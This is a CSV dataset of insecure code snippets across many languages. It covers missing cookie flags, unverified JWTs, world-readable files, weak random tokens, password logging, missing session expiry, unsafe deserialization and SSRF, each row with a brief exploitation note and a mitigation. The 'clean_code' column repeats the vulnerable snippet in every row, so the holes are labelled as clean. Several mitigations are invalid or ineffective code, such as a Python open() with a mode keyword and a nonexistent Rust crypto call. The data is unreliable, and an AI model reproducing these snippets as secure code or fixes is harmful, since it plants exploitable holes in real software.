id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-714,Scala,Insecure Cookie Configuration,Cookies without HttpOnly flag.,"Ok.withCookies(Cookie(""session"", token))",Steal cookies via XSS.,"Set: Ok.withCookies(Cookie(""session"", token, httpOnly = true))","Ok.withCookies(Cookie(""session"", token))",False,False,False,False,40,False,True,False,Configuration,1
vuln-715,Rust,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"res.cookie(Cookie::new(""session"", token))",Access cookies via XSS.,"Set: res.cookie(Cookie::new(""session"", token).http_only(true))","res.cookie(Cookie::new(""session"", token))",False,False,False,False,41,False,True,False,Configuration,1
vuln-716,Elixir,Insecure Cookie Configuration,Cookies without HttpOnly flag.,"put_resp_cookie(conn, ""session"", token)",Steal cookies via XSS.,"Set: put_resp_cookie(conn, ""session"", token, http_only: true)","put_resp_cookie(conn, ""session"", token)",False,False,False,False,39,False,True,False,Configuration,1
vuln-717,Perl,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"$r->headers_out->set('Set-Cookie' => ""session=$token"");",Access cookies via XSS.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly"");","$r->headers_out->set('Set-Cookie' => ""session=$token"");",False,False,False,False,55,False,True,False,Configuration,1
vuln-718,Node.js,Insecure Cookie Scope,Cookies without Secure flag.,"res.cookie('session', token, { httpOnly: true });",Intercept cookies over HTTP.,"Set Secure: res.cookie('session', token, { httpOnly: true, secure: true })","res.cookie('session', token, { httpOnly: true });",False,False,False,False,49,False,True,False,Other,1
vuln-719,Python,Insecure Cookie Scope,Cookies missing Secure flag.,"response.set_cookie('session', token, httponly=True)",Steal cookies over non-HTTPS connections.,"Set: response.set_cookie('session', token, httponly=True, secure=True)","response.set_cookie('session', token, httponly=True)",False,False,False,False,52,False,True,False,Other,1
vuln-720,Java,Insecure Cookie Scope,Cookies without Secure flag.,"Cookie cookie = new Cookie(""session"", token); cookie.setHttpOnly(true); response.addCookie(cookie);",Intercept cookies over HTTP.,Set: cookie.setSecure(true); response.addCookie(cookie);,"Cookie cookie = new Cookie(""session"", token); cookie.setHttpOnly(true); response.addCookie(cookie);",False,False,False,False,99,False,True,False,Other,1
vuln-721,PHP,Insecure Cookie Scope,Cookies missing Secure flag.,"setcookie('session', $token, ['httponly' => true]);",Steal cookies over HTTP.,"Set: setcookie('session', $token, ['httponly' => true, 'secure' => true]);","setcookie('session', $token, ['httponly' => true]);",False,False,False,False,51,False,True,False,Other,1
vuln-722,Ruby,Insecure Cookie Scope,Cookies without Secure flag.,"cookies[:session] = { value: token, httponly: true }",Intercept cookies over non-HTTPS.,"Set: cookies[:session] = { value: token, httponly: true, secure: true }","cookies[:session] = { value: token, httponly: true }",False,False,False,False,52,False,False,False,Other,1
vuln-723,Go,Insecure Cookie Scope,Cookies missing Secure flag.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true})",Steal cookies over HTTP.,"Set: http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true, Secure: true})","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true})",False,False,False,False,78,False,True,False,Other,1
vuln-724,C# (.NET),Insecure Cookie Scope,Cookies without Secure flag.,"Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true });",Intercept cookies over HTTP.,"Set: Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true, Secure = true });","Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true });",False,False,False,False,81,False,True,False,Other,1
vuln-725,Kotlin,Insecure Cookie Scope,Cookies missing Secure flag.,"call.response.cookies.append(""session"", token, httpOnly = true)",Steal cookies over non-HTTPS.,"Set: call.response.cookies.append(""session"", token, httpOnly = true, secure = true)","call.response.cookies.append(""session"", token, httpOnly = true)",False,False,False,False,63,False,True,False,Other,1
vuln-726,Scala,Insecure Cookie Scope,Cookies without Secure flag.,"Ok.withCookies(Cookie(""session"", token, httpOnly = true))",Intercept cookies over HTTP.,"Set: Ok.withCookies(Cookie(""session"", token, httpOnly = true, secure = true))","Ok.withCookies(Cookie(""session"", token, httpOnly = true))",False,False,False,False,57,False,True,False,Other,1
vuln-727,Rust,Insecure Cookie Scope,Cookies missing Secure flag.,"res.cookie(Cookie::new(""session"", token).http_only(true))",Steal cookies over HTTP.,"Set: res.cookie(Cookie::new(""session"", token).http_only(true).secure(true))","res.cookie(Cookie::new(""session"", token).http_only(true))",False,False,False,False,57,False,True,False,Other,1
vuln-728,Elixir,Insecure Cookie Scope,Cookies without Secure flag.,"put_resp_cookie(conn, ""session"", token, http_only: true)",Intercept cookies over non-HTTPS.,"Set: put_resp_cookie(conn, ""session"", token, http_only: true, secure: true)","put_resp_cookie(conn, ""session"", token, http_only: true)",False,False,False,False,56,False,True,False,Other,1
vuln-729,Perl,Insecure Cookie Scope,Cookies missing Secure flag.,"$r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly"");",Steal cookies over HTTP.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly; Secure"");","$r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly"");",False,False,False,False,65,False,True,False,Other,1
vuln-730,Node.js,Insecure JWT Handling,Accepting JWTs without signature verification.,const payload = jwt.decode(token);,Forge JWTs without signature checks.,"Verify: jwt.verify(token, secretKey)",const payload = jwt.decode(token);,False,False,False,False,34,False,False,False,Other,1
vuln-731,Python,Insecure JWT Handling,Decoding JWTs without verifying signatures.,"payload = jwt.decode(token, options={'verify_signature': False})",Craft malicious JWTs.,"Verify: jwt.decode(token, key=secret, algorithms=['HS256'])","payload = jwt.decode(token, options={'verify_signature': False})",False,False,False,False,64,False,True,False,Other,1
vuln-732,Java,Insecure JWT Handling,Parsing JWTs without signature validation.,DecodedJWT jwt = JWT.decode(token);,Forge JWTs to bypass auth.,Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token),DecodedJWT jwt = JWT.decode(token);,False,False,False,False,35,False,False,False,Other,1
vuln-733,PHP,Insecure JWT Handling,Decoding JWTs without verifying signatures.,"$payload = JWT::decode($token, null);",Craft forged JWTs.,"Verify: JWT::decode($token, new Key($secret, 'HS256'))","$payload = JWT::decode($token, null);",False,False,False,False,37,False,False,False,Other,1
vuln-734,Ruby,Insecure JWT Handling,Accepting JWTs without signature checks.,"payload = JWT.decode(token, nil, false)",Forge JWTs to bypass authentication.,"Verify: JWT.decode(token, secret, true, algorithm: 'HS256')","payload = JWT.decode(token, nil, false)",False,False,False,False,39,False,False,False,Other,1
vuln-735,Go,Insecure JWT Handling,Parsing JWTs without signature verification.,"token, _ := jwt.Parse(tokenString, nil)",Craft malicious JWTs.,"Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })","token, _ := jwt.Parse(tokenString, nil)",False,False,False,False,39,False,False,False,Other,1
vuln-736,C# (.NET),Insecure JWT Handling,Decoding JWTs without signature validation.,var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,Forge JWTs to bypass auth.,"Verify: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)",var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,False,False,False,False,60,False,False,False,Other,1
vuln-737,Kotlin,Insecure JWT Handling,Parsing JWTs without signature checks.,val payload = JWT.decode(token),Craft forged JWTs.,Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token),val payload = JWT.decode(token),False,False,False,False,31,False,False,False,Other,1
vuln-738,Scala,Insecure JWT Handling,Decoding JWTs without verifying signatures.,val payload = JWT.decode(token),Forge JWTs to bypass authentication.,Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token),val payload = JWT.decode(token),False,False,False,False,31,False,False,False,Other,1
vuln-739,Rust,Insecure JWT Handling,Parsing JWTs without signature validation.,"let claims = jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(&[]), &Validation::new(Algorithm::HS256))",Craft malicious JWTs.,"Verify: jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))","let claims = jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(&[]), &Validation::new(Algorithm::HS256))",False,False,False,False,118,False,False,False,Other,1
vuln-740,Elixir,Insecure JWT Handling,Decoding JWTs without signature checks.,"{:ok, payload} = Joken.peek(token)",Forge JWTs to bypass auth.,"Verify: Joken.verify_and_validate(token, signer)","{:ok, payload} = Joken.peek(token)",False,False,False,False,34,False,False,False,Other,1
vuln-741,Perl,Insecure JWT Handling,Parsing JWTs without signature verification.,my $payload = decode_jwt($token);,Craft forged JWTs.,"Verify: decode_jwt($token, $secret)",my $payload = decode_jwt($token);,False,False,False,False,33,False,False,False,Other,1
vuln-742,Node.js,Insecure File Permissions,World-readable sensitive files.,"fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o666 });",Read sensitive data from files.,"Restrict: fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o600 })","fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o666 });",False,False,True,False,78,False,True,False,File_Handling,1
vuln-743,Python,Insecure File Permissions,World-readable sensitive configuration files.,"with open('config.json', 'w', mode=0o666) as f: json.dump(config, f)",Access sensitive file contents.,"Restrict: with open('config.json', 'w', mode=0o600) as f: json.dump(config, f)","with open('config.json', 'w', mode=0o666) as f: json.dump(config, f)",False,False,True,False,68,False,True,False,File_Handling,1
vuln-744,Java,Insecure File Permissions,World-readable sensitive files.,"Files.write(Paths.get(""config.json""), config.getBytes(), StandardOpenOption.CREATE);",Read sensitive data from files.,"Set: Files.setPosixFilePermissions(Paths.get(""config.json""), PosixFilePermissions.fromString(""rw-------""))","Files.write(Paths.get(""config.json""), config.getBytes(), StandardOpenOption.CREATE);",False,False,True,False,84,False,True,False,File_Handling,1
vuln-745,PHP,Insecure File Permissions,World-readable sensitive files.,"file_put_contents('config.json', json_encode($config), FILE_APPEND);",Access sensitive file contents.,"Restrict: chmod('config.json', 0600); file_put_contents('config.json', json_encode($config));","file_put_contents('config.json', json_encode($config), FILE_APPEND);",False,False,False,False,68,False,True,False,File_Handling,1
vuln-746,Ruby,Insecure File Permissions,World-readable sensitive files.,"File.write('config.json', config.to_json, mode: 'w')",Read sensitive data from files.,"Restrict: File.write('config.json', config.to_json, mode: 'w', perm: 0600)","File.write('config.json', config.to_json, mode: 'w')",False,False,False,False,52,False,True,False,File_Handling,1
vuln-747,Go,Insecure File Permissions,World-readable sensitive files.,"os.WriteFile(""config.json"", []byte(config), 0666)",Access sensitive file contents.,"Restrict: os.WriteFile(""config.json"", []byte(config), 0600)","os.WriteFile(""config.json"", []byte(config), 0666)",False,False,True,False,49,False,True,False,File_Handling,1
vuln-748,C# (.NET),Insecure File Permissions,World-readable sensitive files.,"File.WriteAllText(""config.json"", JsonSerializer.Serialize(config));",Read sensitive data from files.,"Restrict: File.SetAccessControl(""config.json"", new FileSecurity(""config.json"", AccessControlSections.All));","File.WriteAllText(""config.json"", JsonSerializer.Serialize(config));",False,False,False,False,67,False,True,False,File_Handling,1
vuln-749,Kotlin,Insecure File Permissions,World-readable sensitive files.,"File(""config.json"").writeText(config.toJson())",Access sensitive file contents.,"Restrict: File(""config.json"").writeText(config.toJson(), permissions = PosixFilePermissions.asFileAttribute(setOf(OWNER_READ, OWNER_WRITE)))","File(""config.json"").writeText(config.toJson())",False,False,False,False,46,False,True,False,File_Handling,1
vuln-750,Scala,Insecure File Permissions,World-readable sensitive files.,"Files.write(Paths.get(""config.json""), config.getBytes)",Read sensitive data from files.,"Restrict: Files.setPosixFilePermissions(Paths.get(""config.json""), PosixFilePermissions.fromString(""rw-------""))","Files.write(Paths.get(""config.json""), config.getBytes)",False,False,False,False,54,False,True,False,File_Handling,1
vuln-751,Rust,Insecure File Permissions,World-readable sensitive files.,"fs::write(""config.json"", config.to_string())?",Access sensitive file contents.,"Restrict: fs::OpenOptions::new().write(true).create(true).mode(0o600).open(""config.json"")?.write_all(config.to_string().as_bytes())?","fs::write(""config.json"", config.to_string())?",False,False,False,False,45,False,True,False,File_Handling,1
vuln-752,Elixir,Insecure File Permissions,World-readable sensitive files.,"File.write(""config.json"", Jason.encode!(config))",Read sensitive data from files.,"Restrict: File.write(""config.json"", Jason.encode!(config), [:write, :exclusive, :mode, 0o600])","File.write(""config.json"", Jason.encode!(config))",False,False,False,False,48,False,True,False,File_Handling,1
vuln-753,Perl,Insecure File Permissions,World-readable sensitive files.,"open(my $fh, '>', 'config.json'); print $fh encode_json($config);",Access sensitive file contents.,"Restrict: open(my $fh, '>', 'config.json'); chmod(0600, 'config.json'); print $fh encode_json($config);","open(my $fh, '>', 'config.json'); print $fh encode_json($config);",False,False,True,False,65,False,True,False,File_Handling,1
vuln-754,Node.js,Insecure Random Number Generation,Using Math.random for cryptographic purposes.,const token = Math.random().toString(36).substring(2);,Predict random values.,Use crypto: crypto.randomBytes(16).toString('hex'),const token = Math.random().toString(36).substring(2);,False,False,False,False,54,False,False,False,Other,1
vuln-755,Python,Insecure Random Number Generation,Using random module for security-critical operations.,"token = ''.join(random.choices(string.ascii_letters, k=32))",Predict random values due to weak PRNG.,Use secrets: secrets.token_hex(16),"token = ''.join(random.choices(string.ascii_letters, k=32))",False,False,False,False,59,False,True,False,Other,1
vuln-756,Java,Insecure Random Number Generation,Using Random instead of SecureRandom.,String token = new Random().nextLong().toString();,Predict random values.,Use: SecureRandom random = new SecureRandom(); random.nextBytes(new byte[16]).toString(),String token = new Random().nextLong().toString();,False,False,False,False,50,False,False,False,Other,1
vuln-757,PHP,Insecure Random Number Generation,Using rand() for cryptographic purposes.,"$token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 32);",Predict random values.,Use: bin2hex(random_bytes(16)),"$token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 32);",False,False,False,False,66,False,True,False,Other,1
vuln-758,Ruby,Insecure Random Number Generation,Using rand for security-critical operations.,token = (0...32).map { ('a'..'z').to_a[rand(26)] }.join,Predict random values.,Use: SecureRandom.hex(16),token = (0...32).map { ('a'..'z').to_a[rand(26)] }.join,False,False,False,False,55,False,True,False,Other,1
vuln-759,Go,Insecure Random Number Generation,Using math/rand for cryptographic purposes.,"token := fmt.Sprintf(""%x"", rand.Int63())",Predict random values due to weak PRNG.,"Use: crypto/rand; b := make([]byte, 16); rand.Read(b); hex.EncodeToString(b)","token := fmt.Sprintf(""%x"", rand.Int63())",False,False,False,False,40,False,True,False,Other,1
vuln-760,C# (.NET),Insecure Random Number Generation,Using Random for security-critical operations.,var token = new Random().Next().ToString();,Predict random values.,Use: RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider(); byte[] b = new byte[16]; rng.GetBytes(b); Convert.ToBase64String(b),var token = new Random().Next().ToString();,False,False,False,False,43,False,False,False,Other,1
vuln-761,Kotlin,Insecure Random Number Generation,Using Random for cryptographic purposes.,val token = Random().nextLong().toString(),Predict random values.,Use: SecureRandom().nextBytes(ByteArray(16)).toHex(),val token = Random().nextLong().toString(),False,False,False,False,42,False,False,False,Other,1
vuln-762,Scala,Insecure Random Number Generation,Using scala.util.Random for security-critical operations.,val token = scala.util.Random.nextLong().toString,Predict random values.,Use: java.security.SecureRandom().nextBytes(new Array[Byte](16)).toHex,val token = scala.util.Random.nextLong().toString,False,False,False,False,49,False,False,False,Other,1
vuln-763,Rust,Insecure Random Number Generation,Using rand::thread_rng for cryptographic purposes.,let token = thread_rng().gen::<u64>().to_string();,Predict random values.,Use: rand::crypto::SystemRandom.fill(&mut [0u8; 16]).to_hex(),let token = thread_rng().gen::<u64>().to_string();,False,False,False,False,50,False,False,False,Other,1
vuln-764,Elixir,Insecure Random Number Generation,Using :rand for security-critical operations.,token = :rand.uniform(1_000_000) |> to_string,Predict random values.,Use: :crypto.strong_rand_bytes(16) |> Base.encode16(),token = :rand.uniform(1_000_000) |> to_string,False,False,False,False,45,False,False,False,Other,1
vuln-765,Perl,Insecure Random Number Generation,Using rand for cryptographic purposes.,"my $token = join('', map { ('a'..'z')[rand 26] } 1..32);",Predict random values.,Use: Crypt::Random::Source::random_bytes(16)->hex;,"my $token = join('', map { ('a'..'z')[rand 26] } 1..32);",False,False,False,False,56,False,True,False,Other,1
vuln-766,Node.js,Insecure Logging,Logging sensitive data like passwords.,console.log(`User login: ${req.body.password}`);,Extract sensitive data from logs.,Avoid logging: console.log('User login attempt');,console.log(`User login: ${req.body.password}`);,True,False,False,False,48,False,False,True,Other,1
vuln-767,Python,Insecure Logging,Logging sensitive information.,logging.info(f'User login: {request.form['password']}'),Access sensitive data from logs.,Avoid: logging.info('User login attempt'),logging.info(f'User login: {request.form['password']}'),False,False,False,False,55,False,True,False,Other,1
vuln-768,Java,Insecure Logging,Logging sensitive data like credentials.,"log.info(""User login: "" + request.getParameter(""password""));",Extract credentials from logs.,"Avoid: log.info(""User login attempt"")","log.info(""User login: "" + request.getParameter(""password""));",True,False,False,False,60,False,True,True,Other,1
vuln-769,PHP,Insecure Logging,Logging sensitive data.,error_log('User login: ' . $_POST['password']);,Access sensitive data from logs.,Avoid: error_log('User login attempt');,error_log('User login: ' . $_POST['password']);,False,False,False,False,47,False,True,False,Other,1
vuln-770,Ruby,Insecure Logging,Logging sensitive information.,"Rails.logger.info ""User login: #{params[:password]}""",Extract sensitive data from logs.,Avoid: Rails.logger.info 'User login attempt',"Rails.logger.info ""User login: #{params[:password]}""",True,False,False,False,52,False,True,False,Other,1
vuln-771,Go,Insecure Logging,Logging sensitive data like passwords.,"log.Printf(""User login: %s"", r.FormValue(""password""))",Access credentials from logs.,"Avoid: log.Print(""User login attempt"")","log.Printf(""User login: %s"", r.FormValue(""password""))",False,False,False,False,53,False,True,True,Other,1
vuln-772,C# (.NET),Insecure Logging,Logging sensitive information.,"_logger.LogInformation($""User login: {model.Password}"");",Extract sensitive data from logs.,"Avoid: _logger.LogInformation(""User login attempt"")","_logger.LogInformation($""User login: {model.Password}"");",False,False,False,False,56,False,True,False,Other,1
vuln-773,Kotlin,Insecure Logging,Logging sensitive data like credentials.,"logger.info(""User login: ${call.request.queryParameters[""password""]}"")",Access sensitive data from logs.,"Avoid: logger.info(""User login attempt"")","logger.info(""User login: ${call.request.queryParameters[""password""]}"")",True,True,False,False,70,False,True,True,Other,1
vuln-774,Scala,Insecure Logging,Logging sensitive information.,"logger.info(s""User login: ${params(""password"")}"")",Extract sensitive data from logs.,"Avoid: logger.info(""User login attempt"")","logger.info(s""User login: ${params(""password"")}"")",True,False,False,False,49,False,True,True,Other,1
vuln-775,Rust,Insecure Logging,Logging sensitive data.,"log::info!(""User login: {}"", req.form::<Form>().await?.password);",Access sensitive data from logs.,"Avoid: log::info!(""User login attempt"")","log::info!(""User login: {}"", req.form::<Form>().await?.password);",True,False,False,False,65,False,True,False,Other,1
vuln-776,Elixir,Insecure Logging,Logging sensitive information.,"Logger.info(""User login: #{params[""password""]}"")",Extract sensitive data from logs.,"Avoid: Logger.info(""User login attempt"")","Logger.info(""User login: #{params[""password""]}"")",True,False,False,False,48,False,True,False,Other,1
vuln-777,Perl,Insecure Logging,Logging sensitive data like passwords.,"warn ""User login: "" . $r->param('password');",Access sensitive data from logs.,"Avoid: warn ""User login attempt"";","warn ""User login: "" . $r->param('password');",True,False,False,False,44,False,True,False,Other,1
vuln-778,Node.js,Insecure Session Timeout,No session expiration set.,app.use(session({ secret: 'secret' }));,Reuse old sessions indefinitely.,"Set timeout: session({ secret: 'secret', cookie: { maxAge: 3600000 } })",app.use(session({ secret: 'secret' }));,False,False,False,False,39,False,True,False,Authentication,1
vuln-779,Python,Insecure Session Timeout,Sessions without expiration.,app.config['SESSION_PERMANENT'] = False,Hijack sessions with no expiry.,Set: app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=60),app.config['SESSION_PERMANENT'] = False,False,False,False,False,39,False,True,False,Authentication,1
vuln-780,Java,Insecure Session Timeout,No session timeout configured.,HttpSession session = request.getSession();,Reuse sessions indefinitely.,Set: session.setMaxInactiveInterval(3600);,HttpSession session = request.getSession();,False,False,False,False,43,False,False,False,Authentication,1
vuln-781,PHP,Insecure Session Timeout,Sessions without expiration.,session_start();,Hijack sessions with no timeout.,"Set: ini_set('session.cookie_lifetime', 3600);",session_start();,False,False,False,False,16,False,False,False,Authentication,1
vuln-782,Ruby,Insecure Session Timeout,No session expiration set.,use ActionDispatch::Session::CookieStore,Reuse old sessions.,"Set: use ActionDispatch::Session::CookieStore, expire_after: 1.hour",use ActionDispatch::Session::CookieStore,False,False,False,False,40,False,False,False,Authentication,1
vuln-783,Go,Insecure Session Timeout,Sessions without expiration.,"session := sessions.NewSession(store, ""session"")",Hijack sessions with no expiry.,Set: session.Options.MaxAge = 3600,"session := sessions.NewSession(store, ""session"")",False,False,False,False,48,False,True,False,Authentication,1
vuln-784,C# (.NET),Insecure Session Timeout,No session timeout configured.,services.AddSession();,Reuse sessions indefinitely.,Set: services.AddSession(options => options.IdleTimeout = TimeSpan.FromMinutes(60));,services.AddSession();,False,False,False,False,22,False,False,False,Authentication,1
vuln-785,Kotlin,Insecure Session Timeout,Sessions without expiration.,"install(Sessions) { cookie<UserSession>(""session"") }",Hijack sessions with no timeout.,"Set: cookie<UserSession>(""session"", maxAgeInSeconds = 3600)","install(Sessions) { cookie<UserSession>(""session"") }",False,False,False,False,52,False,True,False,Authentication,1
vuln-786,Scala,Insecure Session Timeout,No session expiration set.,"Ok.withSession(""user"" -> user.id.toString)",Reuse old sessions.,"Set: Ok.withSession(""user"" -> user.id.toString, maxAge = Some(3600))","Ok.withSession(""user"" -> user.id.toString)",False,False,False,False,42,False,True,False,Authentication,1
vuln-787,Rust,Insecure Session Timeout,Sessions without expiration.,"router.get(""/"", |req, res| req.session()?.set(""user"", user))",Hijack sessions with no expiry.,"Set: req.session()?.set_max_age(Duration::from_secs(3600))?.set(""user"", user)","router.get(""/"", |req, res| req.session()?.set(""user"", user))",True,False,False,False,60,False,True,False,Authentication,1
vuln-788,Elixir,Insecure Session Timeout,No session expiration configured.,"plug Plug.Session, store: :cookie, key: ""_session""",Reuse sessions indefinitely.,"Set: plug Plug.Session, store: :cookie, key: ""_session"", max_age: 3600","plug Plug.Session, store: :cookie, key: ""_session""",False,False,False,False,50,False,True,False,Authentication,1
vuln-789,Perl,Insecure Session Timeout,Sessions without expiration.,$r->session->{user} = $user;,Hijack sessions with no timeout.,Set: $r->session->expire_in(3600); $r->session->{user} = $user;,$r->session->{user} = $user;,False,False,False,False,28,False,False,False,Authentication,1
vuln-790,Node.js,Insecure Deserialization,Untrusted data deserialization.,const obj = JSON.parse(req.body.data);,Inject malicious payloads to execute code.,Validate input: if (isValidSchema(req.body.data)) JSON.parse(req.body.data),const obj = JSON.parse(req.body.data);,True,False,False,False,38,False,False,False,Other,1
vuln-791,Python,Insecure Deserialization,Deserializing untrusted data with pickle.,obj = pickle.loads(request.data),Execute arbitrary code via malicious payloads.,Use JSON: json.loads(request.data) with schema validation,obj = pickle.loads(request.data),False,False,False,False,32,False,False,False,Other,1
vuln-792,Java,Insecure Deserialization,Deserializing untrusted input.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); obj = ois.readObject();,Inject malicious serialized objects.,Avoid: Use JSON with ObjectMapper and validate input,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); obj = ois.readObject();,True,False,False,False,102,False,False,False,Other,1
vuln-793,PHP,Insecure Deserialization,Unserializing untrusted data.,$obj = unserialize($_POST['data']);,Execute arbitrary code via malicious input.,Use JSON: json_decode($_POST['data']) with validation,$obj = unserialize($_POST['data']);,False,False,False,False,35,False,True,False,Other,1
vuln-794,Ruby,Insecure Deserialization,Deserializing untrusted data with Marshal.,obj = Marshal.load(params[:data]),Inject malicious payloads for code execution.,Use JSON: JSON.parse(params[:data]) with schema validation,obj = Marshal.load(params[:data]),True,False,False,False,33,False,False,False,Other,1
vuln-795,Go,Insecure Deserialization,Deserializing untrusted data.,var obj interface{}; json.NewDecoder(r.Body).Decode(&obj),Inject malicious JSON payloads.,Validate: Define struct and validate fields before decoding,var obj interface{}; json.NewDecoder(r.Body).Decode(&obj),True,False,False,False,57,False,False,False,Other,1
vuln-796,C# (.NET),Insecure Deserialization,Deserializing untrusted data.,var obj = JsonSerializer.Deserialize<object>(request.Body);,Inject malicious payloads.,Validate: Use specific types and validate input before deserialization,var obj = JsonSerializer.Deserialize<object>(request.Body);,True,False,False,False,59,False,False,False,Other,1
vuln-797,Kotlin,Insecure Deserialization,Deserializing untrusted data.,val obj = Json.decodeFromString<Any>(call.receiveText()),Inject malicious JSON payloads.,Validate: Use specific data class and validate input,val obj = Json.decodeFromString<Any>(call.receiveText()),False,False,False,False,56,False,False,False,Other,1
vuln-798,Scala,Insecure Deserialization,Deserializing untrusted data.,val obj = Json.parse(request.body.asText),Inject malicious payloads.,Validate: Use case class and validate input before parsing,val obj = Json.parse(request.body.asText),True,False,False,False,41,False,False,False,Other,1
vuln-799,Rust,Insecure Deserialization,Deserializing untrusted data.,let obj: serde_json::Value = serde_json::from_reader(req.body()?)?;,Inject malicious JSON payloads.,Validate: Use struct and validate fields before deserialization,let obj: serde_json::Value = serde_json::from_reader(req.body()?)?;,True,False,False,False,67,False,False,False,Other,1
vuln-800,Elixir,Insecure Deserialization,Deserializing untrusted data.,"{:ok, obj} = Jason.decode(params[""data""])",Inject malicious payloads.,Validate: Use struct and validate fields before decoding,"{:ok, obj} = Jason.decode(params[""data""])",True,False,False,False,41,False,True,False,Other,1
vuln-801,Perl,Insecure Deserialization,Deserializing untrusted data with Storable.,my $obj = Storable::thaw($r->param('data'));,Inject malicious payloads for code execution.,Use JSON: decode_json($r->param('data')) with validation,my $obj = Storable::thaw($r->param('data'));,True,False,False,False,44,False,True,False,Other,1
vuln-802,Node.js,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,const response = await axios.get(req.query.url);,Access internal services or localhost endpoints.,Validate URLs: if (isValidExternalUrl(req.query.url)) axios.get(req.query.url),const response = await axios.get(req.query.url);,True,True,False,False,48,False,False,False,Other,1
vuln-803,Python,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,response = requests.get(request.args.get('url')),Request internal or restricted endpoints.,Restrict: if is_allowed_url(request.args.get('url')): requests.get(...),response = requests.get(request.args.get('url')),False,False,False,False,48,False,True,False,Other,1
vuln-804,Java,Server-Side Request Forgery (SSRF),Unvalidated URL in HTTP requests.,"URL url = new URL(request.getParameter(""url"")); HttpURLConnection conn = url.openConnection();",Access internal network resources.,"Validate: if (isValidUrl(request.getParameter(""url""))) url.openConnection()","URL url = new URL(request.getParameter(""url"")); HttpURLConnection conn = url.openConnection();",True,False,True,False,94,False,True,False,Other,1
vuln-805,PHP,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,$response = file_get_contents($_GET['url']);,Access internal or sensitive endpoints.,Validate: if (is_allowed_url($_GET['url'])) file_get_contents($_GET['url']),$response = file_get_contents($_GET['url']);,False,False,False,False,44,False,True,False,Other,1
vuln-806,Ruby,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,response = Net::HTTP.get(URI(params[:url])),Access internal services or localhost.,Validate: Net::HTTP.get(URI(params[:url])) if is_valid_url(params[:url]),response = Net::HTTP.get(URI(params[:url])),True,False,False,False,43,False,False,False,Other,1
